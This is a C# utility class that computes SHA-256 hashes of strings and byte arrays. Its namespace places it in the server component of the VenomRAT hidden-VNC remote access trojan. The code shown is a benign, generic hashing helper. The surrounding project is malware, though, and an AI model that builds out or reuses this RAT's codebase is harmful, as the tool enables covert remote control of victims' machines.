using System.Security.Cryptography;
using System.Text;

namespace VenomRAT_HVNC.Server.Algorithm
{
    public static class Sha256
    {
        public static string ComputeHash(string input)
        {
            byte[] array = Encoding.UTF8.GetBytes(input);
            using (SHA256Managed sha256Managed = new SHA256Managed())
            {
                array = sha256Managed.ComputeHash(array);
            }
            StringBuilder stringBuilder = new StringBuilder();
            foreach (byte b in array)
            {
                stringBuilder.Append(b.ToString("X2"));
            }
            return stringBuilder.ToString().ToUpper();
        }

        public static byte[] ComputeHash(byte[] input)
        {
            byte[] result;
            using (SHA256Managed sha256Managed = new SHA256Managed())
            {
                result = sha256Managed.ComputeHash(input);
            }
            return result;
        }
    }
}
